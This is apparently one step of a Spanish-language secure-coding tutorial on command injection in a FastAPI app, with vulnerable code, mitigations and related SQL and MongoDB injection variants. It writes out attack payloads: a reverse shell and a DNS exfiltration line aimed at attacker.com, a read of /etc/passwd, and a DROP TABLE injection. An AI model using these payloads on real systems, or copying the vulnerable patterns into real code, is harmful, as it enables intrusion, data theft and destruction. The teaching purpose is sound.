# Paso 1 — Command Injection
**Tecnología:** Python / FastAPI | **OWASP:** A03:2021 – Injection | **CWE-78**

---

## ¿Qué es esta vulnerabilidad?

*Command Injection* ocurre cuando una aplicación construye un comando de sistema operativo concatenando datos controlados por el usuario y lo pasa a un intérprete de shell. El shell trata metacaracteres como `;`, `&&`, `|`, `` `...` `` y `$(...)` como separadores o expansores de comandos, lo que permite encadenar comandos arbitrarios al original.

Es una de las vulnerabilidades más graves en aplicaciones web: una explotación exitosa lleva directamente a **ejecución remota de código (RCE)** con los privilegios del proceso servidor. El impacto puede incluir robo de credenciales del sistema, instalación de backdoors, pivoting a redes internas o borrado de datos.

Aparece de forma recurrente en breaches reales. Un ejemplo notable fue la vulnerabilidad CVE-2021-41773 en Apache HTTP Server, donde una sola petición con path traversal + command injection comprometía el servidor completo.

---

## ¿Dónde ocurre en este código?

**Archivo:** `src/python/routes/commands.py`

```python
# ❌ CÓDIGO VULNERABLE — estado actual del ejercicio
@router.get("/ping")
async def ping_host(host: str):
    result = subprocess.run(
        f"ping -c 1 {host}",   # 👈 input del usuario interpolado en la cadena
        shell=True,             # 👈 activa el intérprete /bin/sh
        capture_output=True,
        text=True
    )
    return {"output": result.stdout}
```

El problema es doble:
1. `shell=True` hace que Python pase la cadena completa a `/bin/sh -c "ping -c 1 <VALOR>"`. El shell interpreta metacaracteres antes de ejecutar.
2. El valor de `host` llega sin validación directamente desde la query string HTTP.

Cuando el servidor recibe `host=8.8.8.8; cat /etc/passwd`, construye:
```sh
/bin/sh -c "ping -c 1 8.8.8.8; cat /etc/passwd"
```
El shell ejecuta `ping` y luego `cat /etc/passwd`, devolviendo el archivo de credenciales en la respuesta.

---

## Cómo lo explotaría un atacante

**Ataque básico — separador `;`:**
```
GET /ping?host=8.8.8.8;cat+/etc/passwd
```
Resultado: el servidor ejecuta `ping` y después lee `/etc/passwd`.

**Reverse shell — subshell `$()`:**
```
GET /ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261'
```
Abre una shell interactiva hacia la máquina del atacante.

**Exfiltración out-of-band via DNS (evade firewalls):**
```
GET /ping?host=8.8.8.8;nslookup+$(whoami).attacker.com
```
El nombre del usuario del proceso servidor llega codificado en una petición DNS al dominio del atacante.

**Bypass con backticks:**
```
GET /ping?host=8.8.8.8%60id%60
```
Equivalente a `$(id)`, produce el mismo efecto en muchos shells.

---

## Tu tarea: aplicar la mitigación

Modifica `src/python/routes/commands.py` para que el endpoint rechace inputs inválidos y no use el intérprete de shell:

```python
# ✅ CÓDIGO SEGURO
import re
import subprocess
from fastapi import APIRouter, HTTPException

router = APIRouter()

# Allowlist estricta: solo hostnames/IPs con caracteres legítimos
VALID_HOSTNAME = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

@router.get("/ping")
async def ping_host(host: str):
    if not VALID_HOSTNAME.match(host):
        raise HTTPException(status_code=400, detail="Hostname inválido")
    result = subprocess.run(
        ["ping", "-c", "1", host],  # ✅ lista de args → execvp() directo, sin shell
        capture_output=True,
        text=True,
        timeout=5
    )
    return {"output": result.stdout}
```

### ¿Por qué funciona esta mitigación?

- **Lista de argumentos:** cuando `subprocess.run()` recibe una lista, Python llama directamente a `execvp()` del SO. No hay shell intermediario. Los metacaracteres `;`, `&&` y `|` son pasados como texto literal al programa.
- **Eliminar `shell=True`:** sin esta flag, Python nunca invoca `/bin/sh`. El kernel ejecuta el binario directamente.
- **Allowlist con regex:** rechaza antes de llegar al subproceso. La regex `^[a-zA-Z0-9.\-]{1,253}$` excluye todos los metacaracteres de shell.
- **`timeout=5`:** previene DoS donde el atacante fuerza `ping` hacia hosts inalcanzables para agotar threads.

---

## Variantes de la misma categoría (Injection — más complejas)

### Variante A: Argument Injection (sin `shell=True`, pero args controlables)

Incluso sin `shell=True`, si los argumentos del subproceso son controlados por el usuario, hay programas que interpretan flags peligrosas:

```python
# ❌ VULNERABLE — convert (ImageMagick) acepta flags que ejecutan código
@router.get("/thumbnail")
async def make_thumbnail(filename: str):
    # Sin shell=True, pero filename puede contener flags de ImageMagick
    subprocess.run(["convert", filename, "-resize", "100x100", "/tmp/thumb.jpg"])
```

Ataque: `filename=-write|id>/tmp/rce` o usando la feature `Ghostscript delegate`:
```
GET /thumbnail?filename=image.jpg%22%20-write%20%22|id%20>/tmp/rce%22
```

```python
# ✅ SEGURO — validar nombre y construir ruta controlada
SAFE_NAME = re.compile(r'^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$')

@router.get("/thumbnail")
async def make_thumbnail(filename: str):
    if not SAFE_NAME.match(filename):
        raise HTTPException(status_code=400)
    safe_path = os.path.join("/var/uploads", filename)  # ruta controlada por nosotros
    subprocess.run(["convert", safe_path, "-resize", "100x100", "/tmp/thumb.jpg"])
```

---

### Variante B: SQL Injection en consulta raw

```python
# ❌ VULNERABLE — concatenación directa en SQL
@router.get("/orders")
async def get_orders(user_id: str):
    query = f"SELECT * FROM orders WHERE user_id = '{user_id}'"
    cursor.execute(query)
    return cursor.fetchall()
```

Payload `user_id=' OR '1'='1` devuelve todos los pedidos de la base de datos.  
Payload `user_id='; DROP TABLE orders; --` borra la tabla.

```python
# ✅ SEGURO — parámetros posicionales (placeholder)
@router.get("/orders")
async def get_orders(user_id: str):
    cursor.execute("SELECT * FROM orders WHERE user_id = %s", (user_id,))
    return cursor.fetchall()
```

El driver de base de datos envía el parámetro por separado del SQL; el motor nunca lo interpreta como sintaxis.

---

### Variante C: Injection en operadores NoSQL (`$where` en MongoDB)

```python
# ❌ VULNERABLE — $where evalúa JavaScript en el servidor MongoDB
@router.get("/search")
async def search_users(role: str):
    users = db.users.find({"$where": f"this.role == '{role}'"})
    return list(users)
```

Payload `role=' || sleep(5000) || '1'=='1` provoca un DoS de 5 segundos.  
Payload `role=' || this.password.match(/.*/) || '1'=='1` exfiltra contraseñas.

```python
# ✅ SEGURO — operador de igualdad directa, sin $where
VALID_ROLES = {"admin", "user", "moderator"}

@router.get("/search")
async def search_users(role: str):
    if role not in VALID_ROLES:
        raise HTTPException(status_code=400)
    users = db.users.find({"role": role})  # comparación directa, sin JS
    return list(users)
```

---

## Referencias

- [OWASP A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [Python subprocess — security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [CVE-2021-41773 — Apache RCE via path traversal + CGI](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)

---

## Lo que valida el workflow automáticamente

El workflow **Validate Step 01** ejecuta `bash scripts/tutorial.sh validate-step 01` y exige que `src/python/routes/commands.py` contenga:
- La expresión regular `VALID_HOSTNAME`
- La llamada segura a `subprocess.run` con lista de argumentos
- La ausencia de `shell=True`